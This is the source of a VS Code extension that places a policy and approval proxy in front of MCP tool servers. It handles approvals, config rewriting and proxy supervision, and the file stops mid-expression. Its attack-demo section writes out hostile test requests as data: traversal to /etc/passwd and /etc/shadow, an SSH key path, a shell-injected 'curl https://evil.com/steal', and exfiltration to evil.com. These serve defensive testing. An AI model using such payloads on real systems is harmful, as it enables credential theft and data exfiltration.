/**
 * MCP Shield — VS Code Extension Host
 * ===================================
 *
 * Responsibilities, in order of importance:
 *
 *   1. Own the SQLite database that the out-of-process proxies read policy from
 *      and write audit records to.
 *   2. Run the IPC server that answers approval requests from those proxies.
 *   3. Discover MCP client configuration files and rewrite them to insert or
 *      remove the shield.
 *   4. Supervise HTTP proxy child processes (stdio proxies are spawned by the
 *      MCP client itself, so they need no supervision here).
 *   5. Render the dashboard.
 *
 * The extension is *not* in the data path for stdio servers. That is deliberate:
 * if VS Code is closed, a shielded stdio server still gets policy enforcement,
 * because the proxy reads the same database directly. What is lost without
 * VS Code running is the interactive prompt — and in that case a gated call
 * fails closed after the approval timeout rather than being waved through.
 */

import * as vscode from "vscode";
import * as fs from "fs";
import * as path from "path";
import * as net from "net";
import * as crypto from "crypto";
import { spawn, ChildProcess } from "child_process";
import {
  openDB,
  getAuditLogs,
  getWarnings,
  getAllPolicies,
  savePolicy,
  updateApprovalStatus,
  getActivePendingApprovals,
  saveApprovalRule,
  getApprovalRules,
  deleteApprovalRule,
  clearSessionApprovalRules,
  clearAllPendingApprovals,
} from "./database";
import { getSocketPath, ApprovalRequest, ApprovalResponse } from "./ipc";
import { getWebviewContent } from "./webview";

// ─────────────────────────────────────────────────────────────────────────────
// Module state
// ─────────────────────────────────────────────────────────────────────────────

let dbInstance: any = null;
let dbPathGlobal = "";
let approvalInterval: NodeJS.Timeout | null = null;
let ipcServer: net.Server | null = null;
let activeSocketPath: string | null = null;
let statusBarItem: vscode.StatusBarItem | null = null;
let treeProvider: ShieldTreeProvider | null = null;
let outputChannel: vscode.OutputChannel | null = null;

/**
 * Approval ids currently showing a modal, so the same request is not prompted
 * twice by the IPC handler and the polling fallback simultaneously.
 */
const activePrompts = new Set<string>();

/** Running HTTP proxy children, keyed by `${configPath}::${serverId}`. */
const httpProxies = new Map<string, ChildProcess>();

/**
 * How long a pending row must sit unclaimed before the polling fallback offers
 * it to the user.
 *
 * This fixes a race in the original design. Both the IPC handler and a 1-second
 * poller raised the same modal; whichever won inserted the id into
 * `activePrompts`, and if the poller won, the IPC handler returned early
 * *without writing a socket response*. The proxy then waited out its full
 * 90-second timeout even though the user had already clicked Allow. Giving IPC a
 * head start means the push path handles everything it can, and polling only
 * picks up genuinely orphaned rows.
 */
const POLL_GRACE_MS = 2500;

// ─────────────────────────────────────────────────────────────────────────────
// Activation
// ─────────────────────────────────────────────────────────────────────────────

export async function activate(context: vscode.ExtensionContext) {
  outputChannel = vscode.window.createOutputChannel("MCP Shield");
  context.subscriptions.push(outputChannel);

  const dbPath = getDatabasePath(context);
  dbPathGlobal = dbPath;

  const dbDir = path.dirname(dbPath);
  if (!fs.existsSync(dbDir)) {
    fs.mkdirSync(dbDir, { recursive: true });
  }

  try {
    dbInstance = await openDB(dbPath);
    // Session-scoped approvals must not survive a window reload, or "allow for
    // this session" would quietly become "allow forever".
    await clearSessionApprovalRules(dbInstance);
    // Any pending row here is a leftover from a proxy that died mid-prompt.
    await clearAllPendingApprovals(dbInstance);
    startIpcServer(dbPath, dbInstance);
  } catch (err: any) {
    vscode.window.showErrorMessage(
      `MCP Shield: failed to initialize the policy database: ${err.message}`
    );
    return;
  }

  log(`Database: ${dbPath}`);
  log(`IPC channel: ${getSocketPath(dbPath)}`);

  // ── Commands ─────────────────────────────────────────────────────────────
  context.subscriptions.push(
    vscode.commands.registerCommand("mcp-shield.openDashboard", () => {
      DashboardPanel.createOrShow(context, dbPath);
    }),
    vscode.commands.registerCommand("mcp-shield.scanConfigs", async () => {
      const configs = scanMcpConfigs(context);
      const serverCount = configs.reduce((n, c) => n + c.servers.length, 0);
      const shieldedCount = configs.reduce(
        (n, c) => n + c.servers.filter((s) => s.isShielded).length,
        0
      );
      vscode.window.showInformationMessage(
        `MCP Shield: found ${configs.length} config file(s), ${serverCount} server(s), ${shieldedCount} shielded.`
      );
      treeProvider?.refresh();
      DashboardPanel.createOrShow(context, dbPath);
    }),
    vscode.commands.registerCommand("mcp-shield.runAttackDemo", () =>
      runAttackDemo(context, dbPath)
    ),
    vscode.commands.registerCommand("mcp-shield.revokeAllRules", async () => {
      const rules = await getApprovalRules(dbInstance);
      for (const rule of rules) {
        await deleteApprovalRule(dbInstance, rule.server_id, rule.tool_name);
      }
      vscode.window.showInformationMessage(
        `MCP Shield: revoked ${rules.length} standing approval rule(s).`
      );
    })
  );

  // ── Tree view ────────────────────────────────────────────────────────────
  treeProvider = new ShieldTreeProvider(context);
  context.subscriptions.push(
    vscode.window.registerTreeDataProvider("mcp-shield-sidebar", treeProvider)
  );

  // ── Status bar ───────────────────────────────────────────────────────────
  statusBarItem = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Right, 100);
  statusBarItem.command = "mcp-shield.openDashboard";
  context.subscriptions.push(statusBarItem);
  updateStatusBar(context);
  statusBarItem.show();

  // ── Approval fallback poll ───────────────────────────────────────────────
  approvalInterval = setInterval(() => {
    if (dbInstance) void pollPendingApprovals(dbInstance);
  }, 1000);

  // ── Restore HTTP proxies for already-shielded servers ────────────────────
  // Unlike stdio, nothing else starts these: the MCP client only knows a URL.
  setTimeout(() => {
    const configs = scanMcpConfigs(context);
    for (const config of configs) {
      for (const server of config.servers) {
        if (server.transport === "http" && server.isShielded && server.proxyPort && server.url) {
          startHttpProxy(context, config.path, server.id, server.url, server.proxyPort);
        }
      }
    }
    updateStatusBar(context);
    treeProvider?.refresh();
  }, 1500);
}

export function deactivate() {
  if (approvalInterval) clearInterval(approvalInterval);
  if (ipcServer) ipcServer.close();

  for (const [key, child] of httpProxies) {
    try {
      child.kill();
    } catch {
      /* already gone */
    }
    httpProxies.delete(key);
  }

  // Unix sockets leave a filesystem entry behind; Windows named pipes do not.
  if (activeSocketPath && process.platform !== "win32" && fs.existsSync(activeSocketPath)) {
    try {
      fs.unlinkSync(activeSocketPath);
    } catch {
      /* best effort */
    }
  }
}

function log(message: string) {
  outputChannel?.appendLine(`[${new Date().toISOString()}] ${message}`);
}

// ─────────────────────────────────────────────────────────────────────────────
// IPC server (answers approval requests from proxy processes)
// ─────────────────────────────────────────────────────────────────────────────

function startIpcServer(dbPath: string, db: any) {
  const socketPath = getSocketPath(dbPath);
  activeSocketPath = socketPath;

  // A stale socket file from a crashed window would make listen() fail with
  // EADDRINUSE, so clear it first. Windows named pipes are cleaned up by the OS.
  if (process.platform !== "win32" && fs.existsSync(socketPath)) {
    try {
      fs.unlinkSync(socketPath);
    } catch {
      /* fall through to the listen error handler */
    }
  }

  ipcServer = net.createServer((socket) => {
    let buffer = "";
    socket.on("data", (chunk) => {
      buffer += chunk.toString("utf8");
      let idx;
      while ((idx = buffer.indexOf("\n")) !== -1) {
        const line = buffer.substring(0, idx).trim();
        buffer = buffer.substring(idx + 1);
        if (!line) continue;
        try {
          const req = JSON.parse(line) as ApprovalRequest;
          void handleIpcApprovalRequest(req, socket, db);
        } catch (err) {
          log(`IPC: malformed request frame ignored: ${err}`);
        }
      }
    });

    socket.on("error", (err) => log(`IPC socket error: ${err.message}`));
  });

  ipcServer.listen(socketPath, () => log("IPC server listening"));
  ipcServer.on("error", (err) => {
    log(`IPC server error: ${err.message}`);
    vscode.window.showWarningMessage(
      "MCP Shield: could not open the approval channel. Gated tool calls will fall back to slower database polling."
    );
  });
}

/**
 * Prompt the developer and answer the proxy over the socket.
 *
 * Critically, this *always* writes a response — including when the request is a
 * duplicate. The original returned early on a duplicate id without replying,
 * leaving the proxy to wait out its 90-second timeout.
 */
async function handleIpcApprovalRequest(req: ApprovalRequest, socket: net.Socket, db: any) {
  const respond = (status: "APPROVED" | "DENIED") => {
    const res: ApprovalResponse = { id: req.id, status };
    try {
      if (!socket.destroyed) socket.write(JSON.stringify(res) + "\n");
    } catch (err) {
      log(`IPC: failed to write response: ${err}`);
    }
  };

  if (activePrompts.has(req.id)) {
    // Already being handled elsewhere; do not raise a second modal, but do not
    // leave the caller hanging either.
    return;
  }
  activePrompts.add(req.id);

  try {
    const decision = await promptForApproval({
      serverId: req.serverId,
      toolName: req.toolName,
      argumentsJson: req.arguments,
    });

    if (decision.status === "APPROVED" && decision.remember) {
      await saveApprovalRule(
        db,
        req.serverId,
        req.toolName,
        decision.remember,
        decision.remember === "SESSION" ? SESSION_RULE_TTL_MS : 0
      );
    }

    await updateApprovalStatus(db, req.id, decision.status).catch(() => undefined);
    respond(decision.status);
  } catch (err: any) {
    log(`Approval handling failed, denying: ${err?.message ?? err}`);
    // Fail closed on an internal error.
    respond("DENIED");
  } finally {
    activePrompts.delete(req.id);
  }
}

/** Session rules last two hours, long enough for a work session. */
const SESSION_RULE_TTL_MS = 2 * 60 * 60 * 1000;

interface ApprovalDecision {
  status: "APPROVED" | "DENIED";
  /** Set when the user asked not to be prompted for this tool again. */
  remember?: "ALWAYS" | "SESSION";
}

/**
 * Show the authorization modal.
 *
 * The "Allow" / "Allow for Session" / "Always Allow" spread exists to solve a
 * real security problem, not just an annoyance. When the only options are
 * approve-every-time or disable protection, users disable protection. Offering a
 * *scoped* standing approval — one tool, one server, optionally time-limited —
 * removes the incentive to loosen the whole policy.
 *
 * Dismissing the dialog counts as DENIED. An unattended machine must not become
 * an open door.
 */
async function promptForApproval(req: {
  serverId: string;
  toolName: string;
  argumentsJson: string;
}): Promise<ApprovalDecision> {
  let formattedArgs: string;
  try {
    formattedArgs = JSON.stringify(JSON.parse(req.argumentsJson), null, 2);
  } catch {
    formattedArgs = req.argumentsJson;
  }

  // Keep the dialog readable; the dashboard has the full payload.
  if (formattedArgs.length > 1500) {
    formattedArgs = formattedArgs.slice(0, 1500) + "\n… (truncated, see dashboard)";
  }

  const detail =
    `Server: ${req.serverId}\n` +
    `Tool: ${req.toolName}\n\n` +
    `Arguments:\n${formattedArgs}\n\n` +
    `This tool passed automated policy checks and needs your authorization.`;

  const selection = await vscode.window.showWarningMessage(
    "MCP Shield — Authorization Required",
    { modal: true, detail },
    "Allow Once",
    "Allow for Session",
    "Always Allow"
  );

  switch (selection) {
    case "Allow Once":
      vscode.window.setStatusBarMessage("$(check) MCP Shield: tool call allowed", 3000);
      return { status: "APPROVED" };
    case "Allow for Session":
      vscode.window.setStatusBarMessage(
        `$(check) MCP Shield: '${req.toolName}' allowed for this session`,
        4000
      );
      return { status: "APPROVED", remember: "SESSION" };
    case "Always Allow":
      vscode.window.setStatusBarMessage(
        `$(check) MCP Shield: '${req.toolName}' always allowed — revoke from the dashboard`,
        5000
      );
      return { status: "APPROVED", remember: "ALWAYS" };
    default:
      // Includes Cancel and dialog dismissal.
      vscode.window.setStatusBarMessage("$(x) MCP Shield: tool call blocked", 3000);
      return { status: "DENIED" };
  }
}

/**
 * Fallback path: offer approvals that the IPC channel did not claim.
 *
 * Only rows older than POLL_GRACE_MS are considered, so this never competes with
 * the push channel for a live request.
 */
async function pollPendingApprovals(db: any) {
  try {
    const pending = await getActivePendingApprovals(db);
    const now = Date.now();

    for (const approval of pending) {
      if (activePrompts.has(approval.id)) continue;
      if (now - approval.timestamp < POLL_GRACE_MS) continue;

      activePrompts.add(approval.id);
      void (async () => {
        try {
          const decision = await promptForApproval({
            serverId: approval.server_id,
            toolName: approval.tool_name,
            argumentsJson: approval.arguments,
          });
          if (decision.status === "APPROVED" && decision.remember) {
            await saveApprovalRule(
              db,
              approval.server_id,
              approval.tool_name,
              decision.remember,
              decision.remember === "SESSION" ? SESSION_RULE_TTL_MS : 0
            );
          }
          await updateApprovalStatus(db, approval.id, decision.status);
        } catch (err: any) {
          log(`Fallback approval failed: ${err?.message ?? err}`);
        } finally {
          activePrompts.delete(approval.id);
        }
      })();
    }
  } catch {
    // The proxy may be mid-write; a failed poll is retried in one second.
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// Database location
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Resolve where the policy database lives.
 *
 * Defaults to the extension's global storage, NOT the workspace root.
 *
 * The original defaulted to `<workspaceRoot>/mcp-shield.db`, which caused two
 * problems. It scattered audit databases into unrelated projects, and — worse —
 * the absolute path gets baked into the MCP client's config at shield time. Open
 * a different folder in VS Code and the extension would open a *different*
 * database with a *different* IPC pipe hash, so approval prompts silently stopped
 * appearing until every gated call timed out.
 *
 * Global storage gives one database, one IPC channel, and policies that follow
 * the user rather than the folder. A workspace-local file is still available by
 * setting `mcpShield.databasePath` explicitly.
 */
function getDatabasePath(context: vscode.ExtensionContext): string {
  const configured = vscode.workspace.getConfiguration("mcpShield").get<string>("databasePath");

  if (configured && configured.trim() !== "") {
    if (path.isAbsolute(configured)) return configured;
    const workspaceRoot = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath;
    if (workspaceRoot) return path.resolve(workspaceRoot, configured);
  }

  return path.join(context.globalStorageUri.fsPath, "mcp-shield.db");
}

// ─────────────────────────────────────────────────────────────────────────────
// MCP client configuration discovery
// ─────────────────────────────────────────────────────────────────────────────

export interface DetectedServer {
  id: string;
  transport: "stdio" | "http";
  command: string;
  args: string[];
  url?: string;
  proxyPort?: number;
  isShielded: boolean;
}

export interface DetectedConfig {
  name: string;
  path: string;
  servers: DetectedServer[];
}

/**
 * Well-known MCP client config locations.
 *
 * These paths are the integration surface of the whole project, and they are the
 * part most likely to rot: each client vendor picks its own location and can move
 * it between releases. Keeping them in one table makes that maintenance visible.
 */
function candidateConfigPaths(): { name: string; path: string }[] {
  const home = process.env.HOME || process.env.USERPROFILE || "";
  const appData = process.env.APPDATA || "";
  const win = process.platform === "win32";
  const mac = process.platform === "darwin";

  const vsCodeGlobalStorage = (publisher: string, file: string) =>
    win
      ? path.join(appData, "Code", "User", "globalStorage", publisher, "settings", file)
      : mac
      ? path.join(home, "Library", "Application Support", "Code", "User", "globalStorage", publisher, "settings", file)
      : path.join(home, ".config", "Code", "User", "globalStorage", publisher, "settings", file);

  return [
    {
      name: "Claude Desktop",
      path: win
        ? path.join(appData, "Claude", "claude_desktop_config.json")
        : mac
        ? path.join(home, "Library", "Application Support", "Claude", "claude_desktop_config.json")
        : path.join(home, ".config", "Claude", "claude_desktop_config.json"),
    },
    {
      name: "Cline",
      path: vsCodeGlobalStorage("saoudrizwan.claude-dev", "cline_mcp_settings.json"),
    },
    {
      name: "Roo Code",
      path: vsCodeGlobalStorage("rooveterinaryinc.roo-cline", "mcp_settings.json"),
    },
    {
      name: "Cursor",
      path: path.join(home, ".cursor", "mcp.json"),
    },
    {
      name: "Windsurf",
      path: path.join(home, ".codeium", "windsurf", "mcp_config.json"),
    },
  ];
}

/**
 * Read every known config file and report the servers it declares, noting which
 * are already shielded.
 *
 * Detection of "already shielded" works by recognising our own rewrite: for stdio
 * the command is `node` with `gateway.js` as the first argument, and for HTTP we
 * leave an `_mcpShieldUpstream` marker holding the original URL. That marker is
 * also what makes unshielding lossless.
 */
export function scanMcpConfigs(context: vscode.ExtensionContext): DetectedConfig[] {
  const results: DetectedConfig[] = [];

  for (const candidate of candidateConfigPaths()) {
    if (!fs.existsSync(candidate.path)) continue;

    try {
      const parsed = JSON.parse(fs.readFileSync(candidate.path, "utf8"));
      // Different clients nest the map under different keys.
      const servers = parsed.mcpServers || parsed.servers || {};
      const detected: DetectedServer[] = [];

      for (const serverId of Object.keys(servers)) {
        const entry = servers[serverId];
        if (!entry || typeof entry !== "object") continue;

        // ── HTTP / SSE ──────────────────────────────────────────────────────
        if (entry.url) {
          const isShielded = Boolean(entry._mcpShieldUpstream);
          detected.push({
            id: serverId,
            transport: "http",
            command: "",
            args: [],
            url: isShielded ? entry._mcpShieldUpstream : entry.url,
            proxyPort: entry._mcpShieldProxyPort,
            isShielded,
          });
          continue;
        }

        // ── stdio ───────────────────────────────────────────────────────────
        const argsList: string[] = Array.isArray(entry.args) ? entry.args : [];
        let isShielded = false;
        let originalCommand = entry.command ?? "";
        let originalArgs = [...argsList];

        if (entry.command === "node" && argsList.length > 0 && argsList[0].includes("gateway.js")) {
          isShielded = true;
          const separatorIdx = argsList.indexOf("--");
          if (separatorIdx !== -1 && separatorIdx + 1 < argsList.length) {
            originalCommand = argsList[separatorIdx + 1];
            originalArgs = argsList.slice(separatorIdx + 2);
          }
        }

        detected.push({
          id: serverId,
          transport: "stdio",
          command: originalCommand,
          args: originalArgs,
          isShielded,
        });
      }

      results.push({ name: candidate.name, path: candidate.path, servers: detected });
    } catch (err: any) {
      log(`Failed to parse ${candidate.path}: ${err.message}`);
    }
  }

  return results;
}

// ─────────────────────────────────────────────────────────────────────────────
// Shielding / unshielding
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Insert or remove the shield for one server by rewriting the client's config.
 *
 * A timestamped backup is written before every edit. The original overwrote a
 * single `.bak` file each time, so two toggles destroyed the only copy of the
 * user's original configuration.
 */
async function toggleShieldServer(
  context: vscode.ExtensionContext,
  configPath: string,
  serverId: string,
  shield: boolean
): Promise<{ ok: boolean; message: string }> {
  if (!fs.existsSync(configPath)) {
    return { ok: false, message: `Config file no longer exists: ${configPath}` };
  }

  try {
    const raw = fs.readFileSync(configPath, "utf8");
    const parsed = JSON.parse(raw);
    const servers = parsed.mcpServers || parsed.servers;
    if (!servers || !servers[serverId]) {
      return { ok: false, message: `Server '${serverId}' not found in ${configPath}` };
    }

    // Timestamped backup so history is preserved across repeated toggles.
    const stamp = new Date().toISOString().replace(/[:.]/g, "-");
    try {
      fs.writeFileSync(`${configPath}.${stamp}.bak`, raw, "utf8");
    } catch (err: any) {
      // Refuse to edit if we cannot back up first.
      return { ok: false, message: `Could not write a backup, aborting: ${err.message}` };
    }

    const entry = servers[serverId];
    const proxyKey = `${configPath}::${serverId}`;

    if (entry.url) {
      // ── HTTP transport ────────────────────────────────────────────────────
      const gatewayHttpPath = path.join(context.extensionPath, "dist", "gateway-http.js");

      if (shield) {
        if (entry._mcpShieldUpstream) {
          return { ok: true, message: `'${serverId}' is already shielded.` };
        }
        const upstreamUrl: string = entry.url;
        const port = await allocateProxyPort();

        entry._mcpShieldUpstream = upstreamUrl;
        entry._mcpShieldProxyPort = port;
        entry.url = `http://127.0.0.1:${port}`;

        fs.writeFileSync(configPath, JSON.stringify(parsed, null, 2), "utf8");

        // The extension must actually run the proxy. The original wrote a
        // `_mcpShieldHttpLauncher` array into the config and nothing ever
        // executed it, so "shielded" HTTP servers pointed at a dead port.
        const started = startHttpProxy(context, configPath, serverId, upstreamUrl, port);
        if (!started) {
          return {
            ok: false,
            message: `Config updated but the HTTP proxy failed to start. Check the MCP Shield output channel. Expected ${gatewayHttpPath} to exist — run 'npm run build' if developing.`,
          };
        }
        return {
          ok: true,
          message: `'${serverId}' shielded. Traffic now flows through 127.0.0.1:${port}. Restart your MCP client.`,
        };
      }

      // Unshield
      if (entry._mcpShieldUpstream) {
        entry.url = entry._mcpShieldUpstream;
        delete entry._mcpShieldUpstream;
        delete entry._mcpShieldProxyPort;
        // Remove the dead key written by earlier versions.
        delete entry._mcpShieldHttpLauncher;
      }
      fs.writeFileSync(configPath, JSON.stringify(parsed, null, 2), "utf8");
      stopHttpProxy(proxyKey);
      return { ok: true, message: `'${serverId}' unshielded. Restart your MCP client.` };
    }

    // ── stdio transport ─────────────────────────────────────────────────────
    const gatewayPath = path.join(context.extensionPath, "dist", "gateway.js");

    if (shield) {
      const argsList: string[] = Array.isArray(entry.args) ? entry.args : [];
      if (entry.command === "node" && argsList[0]?.includes("gateway.js")) {
        return { ok: true, message: `'${serverId}' is already shielded.` };
      }
      if (!fs.existsSync(gatewayPath)) {
        return {
          ok: false,
          message: `Gateway bundle missing at ${gatewayPath}. Run 'npm run build'.`,
        };
      }

      entry.args = [
        gatewayPath,
        "--server",
        serverId,
        "--db",
        dbPathGlobal,
        "--",
        entry.command,
        ...argsList,
      ];
      entry.command = "node";
    } else {
      const argsList: string[] = Array.isArray(entry.args) ? entry.args : [];
      if (entry.command === "node" && argsList[0]?.includes("gateway.js")) {
        const separatorIdx = argsList.indexOf("--");
        if (separatorIdx !== -1 && separatorIdx + 1 < argsList.length) {
          entry.command = argsList[separatorIdx + 1];
          entry.args = argsList.slice(separatorIdx + 2);
        }
      }
    }

    fs.writeFileSync(configPath, JSON.stringify(parsed, null, 2), "utf8");
    return {
      ok: true,
      message: `'${serverId}' ${shield ? "shielded" : "unshielded"}. Restart your MCP client to apply.`,
    };
  } catch (err: any) {
    log(`toggleShield failed for ${serverId}: ${err.message}`);
    return { ok: false, message: err.message };
  }
}

/**
 * Find a free loopback port.
 *
 * The original returned `3100 + random(900)` with no availability check, so two
 * shielded servers could collide and the second proxy would die on EADDRINUSE.
 * Binding port 0 lets the OS pick a port it knows is free.
 */
function allocateProxyPort(): Promise<number> {
  return new Promise((resolve, reject) => {
    const probe = net.createServer();
    probe.unref();
    probe.on("error", reject);
    probe.listen(0, "127.0.0.1", () => {
      const address = probe.address();
      const port = typeof address === "object" && address ? address.port : 0;
      probe.close(() => (port ? resolve(port) : reject(new Error("Could not allocate a port"))));
    });
  });
}

/** Spawn and supervise an HTTP proxy child for one shielded server. */
function startHttpProxy(
  context: vscode.ExtensionContext,
  configPath: string,
  serverId: string,
  upstreamUrl: string,
  port: number
): boolean {
  const key = `${configPath}::${serverId}`;
  if (httpProxies.has(key)) return true;

  const gatewayHttpPath = path.join(context.extensionPath, "dist", "gateway-http.js");
  if (!fs.existsSync(gatewayHttpPath)) {
    log(`Cannot start HTTP proxy: ${gatewayHttpPath} not found`);
    return false;
  }

  try {
    const child = spawn(
      process.execPath,
      [
        gatewayHttpPath,
        "--server", serverId,
        "--db", dbPathGlobal,
        "--upstream", upstreamUrl,
        "--port", String(port),
      ],
      // shell: false for the same reason the stdio gateway uses it — a server id
      // or URL containing shell metacharacters must never reach a shell.
      { stdio: ["ignore", "pipe", "pipe"], shell: false }
    );

    child.stdout?.on("data", (d) => log(`[http-proxy ${serverId}] ${d.toString().trim()}`));
    child.stderr?.on("data", (d) => log(`[http-proxy ${serverId}] ${d.toString().trim()}`));
    child.on("exit", (code) => {
      log(`HTTP proxy for '${serverId}' exited with code ${code}`);
      httpProxies.delete(key);
    });

    httpProxies.set(key, child);
    log(`Started HTTP proxy for '${serverId}' on 127.0.0.1:${port} → ${upstreamUrl}`);
    return true;
  } catch (err: any) {
    log(`Failed to spawn HTTP proxy for '${serverId}': ${err.message}`);
    return false;
  }
}

function stopHttpProxy(key: string) {
  const child = httpProxies.get(key);
  if (!child) return;
  try {
    child.kill();
  } catch {
    /* already gone */
  }
  httpProxies.delete(key);
}

// ─────────────────────────────────────────────────────────────────────────────
// Attack simulation
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Run a deliberately hostile MCP server through the real gateway and report what
 * was blocked.
 *
 * This is a genuine end-to-end exercise, not a mock: it spawns `dist/gateway.js`
 * as a subprocess with the bundled malicious server as its target, speaks real
 * JSON-RPC over its stdio, and asserts on the actual replies. Everything the
 * shield does in production — policy evaluation, audit writes, tool-description
 * sanitization — happens here too, which is what makes it worth trusting as a
 * demonstration.
 *
 * The demo server is forced into Strict mode first so nothing waits on a modal.
 */
async function runAttackDemo(context: vscode.ExtensionContext, dbPath: string) {
  const gatewayPath = path.join(context.extensionPath, "dist", "gateway.js");
  const evilServerPath = path.join(context.extensionPath, "resources", "demo-evil-server.js");

  for (const [label, p] of [["gateway", gatewayPath], ["demo server", evilServerPath]] as const) {
    if (!fs.existsSync(p)) {
      vscode.window.showErrorMessage(
        `MCP Shield: cannot run the demo, ${label} bundle missing at ${p}. Run 'npm run build'.`
      );
      return;
    }
  }

  const demoServerId = "mcp-shield-demo";
  await savePolicy(dbInstance, {
    server_id: demoServerId,
    mode: "Strict",
    readonly: 0,
    allowed_paths: JSON.stringify([context.extensionPath]),
    allowed_domains: JSON.stringify(["api.github.com"]),
    disabled_tools: JSON.stringify(["delete_file"]),
    status: "Shielded",
    max_payload_kb: 0,
    block_secrets: 1,
    deny_unlisted_domains: 0,
    scan_results: 1,
  });

  outputChannel?.show(true);
  log("═".repeat(72));
  log("MCP SHIELD — LIVE ATTACK SIMULATION");
  log("Spawning the real gateway with a malicious MCP server as its target.");
  log("═".repeat(72));

  await vscode.window.withProgress(
    { location: vscode.ProgressLocation.Notification, title: "MCP Shield: running attack simulation", cancellable: false },
    async () => {
      const result = await executeAttackScenarios(gatewayPath, evilServerPath, demoServerId, dbPath);

      log("");
      log("─".repeat(72));
      log(`RESULT: ${result.blocked} of ${result.total} attacks blocked.`);
      log("─".repeat(72));

      const allBlocked = result.blocked === result.total;
      const message = `MCP Shield blocked ${result.blocked}/${result.total} simulated attacks.`;
      if (allBlocked) {
        vscode.window.showInformationMessage(message, "Open Dashboard").then((choice) => {
          if (choice === "Open Dashboard") DashboardPanel.createOrShow(context, dbPath);
        });
      } else {
        vscode.window.showWarningMessage(
          `${message} See the MCP Shield output channel for the ones that got through.`
        );
      }
    }
  );
}

interface AttackCase {
  name: string;
  threat: string;
  request: Record<string, unknown>;
}

async function executeAttackScenarios(
  gatewayPath: string,
  evilServerPath: string,
  serverId: string,
  dbPath: string
): Promise<{ blocked: number; total: number }> {
  const attacks: AttackCase[] = [
    {
      name: "Path traversal to /etc/passwd",
      threat: "T-02",
      request: { name: "get_data", arguments: { path: "../../../../etc/passwd" } },
    },
    {
      name: "Absolute path escape to SSH private key",
      threat: "T-02",
      request: { name: "get_data", arguments: { path: "/home/victim/.ssh/id_rsa" } },
    },
    {
      name: "Command injection via shell metacharacter",
      threat: "T-04",
      request: { name: "run_command", arguments: { cmd: "ls; curl https://evil.com/steal" } },
    },
    {
      name: "Data exfiltration to an unlisted domain",
      threat: "T-05",
      request: { name: "fetch_url", arguments: { url: "https://evil.com/collect" } },
    },
    {
      name: "AWS credential exfiltration in arguments",
      threat: "T-07",
      request: {
        name: "fetch_url",
        arguments: { url: "https://api.github.com/x", body: "AKIAIOSFODNN7EXAMPLE" },
      },
    },
    {
      name: "Explicitly denylisted tool",
      threat: "T-06",
      request: { name: "delete_file", arguments: { path: "notes.txt" } },
    },
    {
      name: "Batch-wrapped call (bypass attempt)",
      threat: "T-08",
      request: { name: "__BATCH__", arguments: {} },
    },
  ];

  return new Promise((resolve) => {
    const child = spawn(
      process.execPath,
      [gatewayPath, "--server", serverId, "--db", dbPath, "--", process.execPath, evilServerPath],
      { stdio: ["pipe", "pipe", "pipe"], shell: false }
    );

    let blocked = 0;
    let buffer = "";
    const pending = new Map<number, AttackCase>();
    let settled = false;

    const finish = () => {
      if (settled) return;
      settled = true;
      try {
        child.kill();
      } catch {
        /* already gone */
      }
      resolve({ blocked, total: attacks.length });
    };

    child.stderr?.on("data", (d) => {
      const text = d.toString().trim();
      if (text) log(`  [gateway stderr] ${text}`);
    });

    child.stdout?.on("data", (chunk) => {
      buffer += chunk.toString("utf8");
      let idx;
      while ((idx = buffer.indexOf("\n")) !== -1) {
        const line = buffer.substring(0, idx).trim();
        buffer = buffer.substring(idx + 1);
        if (!line) continue;

        try {
          const msg = JSON.parse(line);
          // A batch attempt is answered with an array of errors.
          const frames = Array.isArray(msg) ? msg : [msg];

          for (const frame of frames) {
            const attack = pending.get(frame.id);
            if (!attack) continue;
            pending.delete(frame.id);

            if (frame.error) {
              blocked++;
              log("");
              log(`  ✓ BLOCKED  [${attack.threat}] ${attack.name}`);
              log(`             ${frame.error.message}`);
            } else {
              log("");
              log(`  ✗ ALLOWED  [${attack.threat}] ${attack.name}`);
              log(`             Server replied: ${JSON.stringify(frame.result).slice(0, 200)}`);
            }
          }

          if (pending.size === 0 && sent) finish();
        } catch {
          /* not a JSON frame */
        }
      }
    });

    child.on("error", (err) => {
      log(`  Demo gateway failed to start: ${err.message}`);
      finish();
    });

    let sent = false;
    const write = (payload: unknown) => child.stdin?.write(JSON.stringify(payload) + "\n");

    // Handshake, then list tools so the sanitizer and capability cache run.
    write({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2024-11-05", capabilities: {} } });
    write({ jsonrpc: "2.0", id: 2, method: "tools/list", params: {} });

    setTimeout(() => {
      attacks.forEach((attack, i) => {
        const id = 100 + i;
        pending.set(id, attack);

        if (attack.request.name === "__BATCH__") {
          // The bypass attempt: wrap a blocked call in a JSON-RPC array. An array
          // has no `.method`, which is why the original forwarded it unexamined.
          write([
            {
              jsonrpc: "2.0",
              id,
              method: "tools/call",
              params: { name: "get_data", arguments: { path: "/etc/shadow" } },
            },
          ]);
        } else {
          write({ jsonrpc: "2.0", id, method: "tools/call", params: attack.request });
        }
      });
      sent = true;
    }, 600);

    // Hard stop so a hung child cannot leave the progress notification spinning.
    setTimeout(finish, 15000);
  });
}

// ─────────────────────────────────────────────────────────────────────────────
// Status bar and tree view
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Reflect actual coverage in the status bar.
 *
 * The original always read "MCP Shield: Active" regardless of whether anything
 * was shielded, which is exactly the kind of reassuring-but-meaningless indicator
 * a security tool should not have. Now it counts real shielded servers and warns
 * when servers are detected but unprotected.
 */
function updateStatusBar(context: vscode.ExtensionContext) {
  if (!statusBarItem) return;

  try {
    const configs = scanMcpConfigs(context);
    const all = configs.flatMap((c) => c.servers);
    const shielded = all.filter((s) => s.isShielded).length;

    if (all.length === 0) {
      statusBarItem.text = "$(shield) MCP Shield: no servers";
      statusBarItem.tooltip = "No MCP servers found in any known client config.";
      statusBarItem.backgroundColor = undefined;
    } else if (shielded === 0) {
      statusBarItem.text = `$(shield) MCP Shield: 0/${all.length} protected`;
      statusBarItem.tooltip = `${all.length} MCP server(s) detected, none shielded. Click to open the dashboard.`;
      statusBarItem.backgroundColor = new vscode.ThemeColor("statusBarItem.warningBackground");
    } else {
      statusBarItem.text = `$(shield) MCP Shield: ${shielded}/${all.length}`;
      statusBarItem.tooltip = `${shielded} of ${all.length} MCP server(s) shielded. Click to open the dashboard.`;
      statusBarItem.backgroundColor =
        shielded < all.length
